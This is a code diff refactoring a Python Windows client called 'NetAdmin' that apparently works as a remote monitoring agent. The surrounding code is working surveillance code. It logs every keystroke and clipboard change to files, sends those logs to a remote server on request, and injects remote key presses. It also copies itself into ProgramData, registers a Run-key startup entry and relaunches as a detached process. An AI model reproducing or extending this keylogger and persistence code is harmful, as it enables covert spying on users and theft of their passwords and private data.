@@ -3,6 +3,7 @@ import base64
 import configparser
 import shutil
 import time
+import traceback
 import cv2
 import keyboard
 import mss
@@ -19,120 +20,26 @@ import winreg
 import win32api
 from os import listdir
 from os.path import isfile, join
+
+import logging_setup
+import reg_helpers
+import runconfig
+import statics
 from OpenConnectionHelpers import *
 from turbojpeg import TurboJPEG
 from os import path
 import mss.windows
 from subprocess import Popen, PIPE
-
 from SmartSocket import SmartSocket
 
-logger = logging.getLogger('logger')
-logger.setLevel(logging.DEBUG)
-
-# create file handler
-import ctypes.wintypes, pathlib
-CSIDL_PERSONAL = 5  # My Documents
-SHGFP_TYPE_CURRENT = 0  # Get current, not default value
-
-# get user documents folder
-od = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
-ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_PERSONAL, None, SHGFP_TYPE_CURRENT, od)
-loggerDir = ""
-for c in od:
-    if c == '\0':
-        break
-    loggerDir += c
-loggerDir = os.path.join(loggerDir, "NetAdmin\\client_files")
-pathlib.Path(loggerDir).mkdir(parents=True, exist_ok=True)
-loggerDir = os.path.join(loggerDir, "client_log.log")
-fh = logging.FileHandler(loggerDir)
-fh.setLevel(logging.DEBUG)
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s - %(lineno)d')
-fh.setFormatter(formatter)
-# add the handler
-logger.addHandler(fh)
-logger.info("Logger initialized")
-
-
-def stringToBase64(s):
-    return base64.b64encode(s.encode('utf-8'))
-
-def base64ToString(b):
-    return base64.b64decode(b).decode('utf-8')
-
 try:
-    if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
-        sys.path.insert(1, os.path.join(sys.path[0], '../shared'))
-        logger.info("Running from source")
-    else:
-        logger.info("Running from executable")
-        logger.info(getattr(sys, '_MEIPASS'))
-        logger.info("WMI CoInitialize")
+    logger = logging_setup.setup_logger()
+    logging_setup.log_PyInstaller_state(logger)
 
     mss.windows.CAPTUREBLT = 0
 
-    BASE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\")
-    KEYLOG_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\keylogger.txt")
-    CLIPBOARD_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\clipboard.txt")
-
-    tp = path.abspath(path.join(path.dirname(__file__), 'lib_bin/turbojpeg-bin/turbojpeg.dll'))
-    logger.info(f"TURBOJPEG PATH: {tp}")
-
-    jpeg = TurboJPEG(tp)
-
-    def set_encryption_key(id):
-        """
-        Creates or modifies an existing registry key specifying the encryption of the client.
-        Args:
-            id: the encryption key to be set or modified to.
-        """
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration")
-        winreg.SetValue(key, 'EKey', winreg.REG_SZ, id)
-
-    def get_encryption_key():
-        """
-        Gets the encryption key of the client. Raises an exception if the key does not exist.
-
-        Returns: the encryption key  found in the registry or None if not found.
-
-        """
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration")
-        return winreg.QueryValue(key, 'EKey')
-
-    def set_id(id):
-        """
-        Creates or modifies an existing registry key specifying the UUID of the client.
-        Args:
-            id: the uuid to be set or modified to.
-        """
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration")
-        winreg.SetValue(key, 'UUID', winreg.REG_SZ, id)
-
-    def get_id():
-        """
-        Gets the UUID of the client. Raises an exception if the key does not exist.
-
-        Returns: the uuid found in the registry or None if not found.
-
-        """
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration")
-        return winreg.QueryValue(key, 'UUID')
-
-    def createServer(port=0, eKey=None):
-        """
-        Creates a server socket and binds it to the specified port. If no port is specified, the socket will be bound to an available port.
-
-        Args:
-            port: the port to bind the server to.
-
-        Returns: the server socket.
-
-        """
-        server = SmartSocket(eKey, socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(('0.0.0.0', port))
-        server.listen(5)
-        return server
+    logger.info(f"TurboJPEG path: {statics.TURBOJPEG_PATH}")
+    jpeg = TurboJPEG(statics.TURBOJPEG_PATH)
 
     # create a decorator to try the function and catch any exceptions
     def try_connection(func):
@@ -353,7 +260,7 @@ try:
         while status:
             with key_queue_lock:
                 if len(key_queue):
-                    with open(KEYLOG_PATH, "a+") as f:
+                    with open(statics.KEYLOGGER_FILE_PATH, "a+") as f:
                         logger.debug("OPENED KEYLOGGER FUNC")
                         f.write(f"[{datetime.datetime.now()}] ")
                         while len(key_queue) > 0:
@@ -367,26 +274,12 @@ try:
             cClip = pyperclip.paste()
             if prevClip != cClip:
                 prevClip = cClip
-                with open(CLIPBOARD_PATH, "a+") as f:
+                with open(statics.CLIPBOARD_FILE_PATH, "a+") as f:
                     logger.debug("OPENED CLIPBOARD FUNC")
                     f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
             time.sleep(2)
 
     process_status = SharedBoolean(True)
-
-    def get_runconfig(application_path):
-        # check if config is present in our directory
-        try:
-            f = open(application_path+"runconfig.ini", "r")
-            logger.info("runconfig.ini found at root: "+application_path+"runconfig.ini")
-        except: # if file was not found
-            try:
-                f = open(path.abspath(path.join(path.dirname(__file__), 'runconfig.ini')), 'r')
-                logger.info("runconfig.ini found at MUI")
-            except:
-                f = None
-        return f
-
 
     def main(config=None):
         # NOT NEEDED SINCE SERVICE
@@ -413,7 +306,7 @@ try:
 
         pythoncom.CoInitialize()
         logger.info("SERVICE STARTED")
-        pathlib.Path(BASE_PATH).mkdir(parents=True, exist_ok=True)
+        pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)
 
         thread = threading.Thread(target=keylogger, args=(process_status,))
         thread.start()
@@ -468,20 +361,24 @@ try:
                 if message['data'] == NetStatusTypes.NetInvalidIdentification.value:
                     print("Invalid identification sent. Resetting...")
                     # reset the id
-                    set_id("")
+                    reg_helpers.set_id("")
                     # send a request to identify again
-                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=NetIdentification(get_id()), id=id))
+                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=NetIdentification(reg_helpers.get_id()), id=id))
 
             # if message is a request
             if message['type'] == NetTypes.NetRequest.value:
-                if message['data'] == NetTypes.NetKeyboardAction.value:
+                if message['data'] == NetTypes.NetHeartbeat.value:
+                    s.send_message(NetMessage(type=NetTypes.NetHeartbeat, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
+                elif message['data'] == NetTypes.NetUninstallClient.value:
+                    quit(0)
+                elif message['data'] == NetTypes.NetKeyboardAction.value:
                     print(f"Keyboard action request from {message['extra']}")
                     pyautogui.press(message['extra'], _pause=False)
 
                 elif message['data'] == NetTypes.NetGetKeylogger.value:
                     print(f"Keylogger request from {message['extra']}")
                     try:
-                        with open(KEYLOG_PATH, "r") as f:
+                        with open(statics.KEYLOGGER_FILE_PATH, "r") as f:
                             logger.debug("OPENED KEYLOGGER")
                             # TODO - split the file into 16KB chunks and send it in 16KB chunks
                             s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
@@ -491,7 +388,7 @@ try:
                 elif message['data'] == NetTypes.NetGetClipboard.value:
                     print(f"Keylogger request from {message['extra']}")
                     try:
-                        with open(CLIPBOARD_PATH, "r") as f:
+                        with open(statics.CLIPBOARD_FILE_PATH, "r") as f:
                             logger.debug("OPENED CLIPBOARD")
                             s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                     except Exception as e:
@@ -570,7 +467,7 @@ try:
 
                 elif message['data'] == NetTypes.NetIdentification.value:  # if request to identify
                     try:
-                        uid = get_id()
+                        uid = reg_helpers.get_id()
                     except:  # will raise an exception if the key does not exist
                         sMessage = NetIdentification(
                             "")  # if there is no id, then send a blank id to tell the server that this is a new client
@@ -579,7 +476,7 @@ try:
                     s.send_message(NetMessage(type=NetTypes.NetIdentification, data=sMessage, id=id))
 
                 elif message['data'] == NetTypes.NetEncryptionVerification.value:  # if request to verify encryption
-                    d = get_encryption_key().encode()
+                    d = reg_helpers.get_encryption_key().encode()
                     s.set_key(d)  # set the encryption key
                     s.send_message(NetMessage(type=NetTypes.NetEncryptionVerification, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
 
@@ -710,8 +607,8 @@ try:
 
             # if server sent an id, then set the id to it
             elif message['type'] == NetTypes.NetIdentification.value:
-                set_id(message['data']['id'])
-                set_encryption_key(message['extra'])
+                reg_helpers.set_id(message['data']['id'])
+                reg_helpers.set_encryption_key(message['extra'])
 
 
     import ctypes, sys
@@ -742,17 +639,17 @@ try:
                 logger.info("IS ADMIN!!!")
 
             # check if exe exists
-            pathlib.Path(BASE_PATH).mkdir(parents=True, exist_ok=True)
+            pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)
             # if not os.path.isfile(BASE_PATH+"NetAdmin.exe"):
             #     # copy our file to the path
             #     logger.info("NetAdmin.exe not found in ProgramData. Copying NetAdmin.exe to ProgramData...")
             logger.info("Copying NetAdmin.exe to ProgramData...")
-            shutil.copy(sys.executable, BASE_PATH + "NetAdmin.exe")
+            shutil.copy(sys.executable, statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")
 
             # verify that config file exists
-            config = get_runconfig(BASE_PATH)
+            config = runconfig.get_runconfig(statics.PROGRAMDATA_NETADMIN_PATH)
             if not config:
-                input_installation(BASE_PATH)
+                input_installation(statics.PROGRAMDATA_NETADMIN_PATH)
 
             # proc_arch = os.environ.get('PROCESSOR_ARCHITECTURE')
             # proc_arch64 = os.environ.get('PROCESSOR_ARCHITEW6432')
@@ -770,7 +667,7 @@ try:
             except Exception as e:
                 print(e)
                 # create registry value
-                winreg.SetValueEx(key, "NetAdmin", 0, winreg.REG_SZ, BASE_PATH + "NetAdmin.exe --run_main")
+                winreg.SetValueEx(key, "NetAdmin", 0, winreg.REG_SZ, statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe --run_main")
                 logger.info("NetAdmin.exe added to startup")
             else:
                 logger.info("NetAdmin.exe already added to startup")
@@ -779,7 +676,7 @@ try:
             CREATE_NEW_PROCESS_GROUP = 0x00000200
             DETACHED_PROCESS = 0x00000008
 
-            Popen([BASE_PATH + "NetAdmin.exe", "-r"], stdin=PIPE, stdout=PIPE, stderr=PIPE, creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
+            Popen([statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe", "-r"], stdin=PIPE, stdout=PIPE, stderr=PIPE, creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
 
             sys.exit(0)
         except Exception as e:
@@ -793,12 +690,12 @@ try:
         ip = input("IP: ")
         port = input("Port: ")
         config = configparser.ConfigParser()
-        config['CONNECTION'] = {'ip': ip, 'port': port}
+        config['CONNECTION'] = {'ip_or_hostname': ip, 'port': port, 'type': 'ip'}
         with open(path + "runconfig.ini", 'w+') as configfile:
             config.write(configfile)
 
     if __name__ == "__main__":
-        logger.info(BASE_PATH+"NetAdmin.exe")
+        logger.info(statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")
         if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
             main()
         else:
@@ -809,7 +706,7 @@ try:
             logger.info("args=%s" % str(sys.argv))
             args = parser.parse_args()
             if args.run_main:
-                config = get_runconfig(get_exe_directory())
+                config = runconfig.get_runconfig(get_exe_directory())
                 if not config:
                     logger.info("ERROR: NO CONFIG FILE WAS FOUND. INSTALLATION CORRUPTED. ")
                 else:
@@ -823,4 +720,4 @@ except Exception as e:
     else:
         exc_type, exc_obj, exc_tb = sys.exc_info()
         fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        logger.info(str(fname) + " " + str(exc_tb.tb_lineno) + " " + str(e))
+        logger.info(str(fname) + " " + str(exc_tb.tb_lineno) + " " + traceback.format_exc())
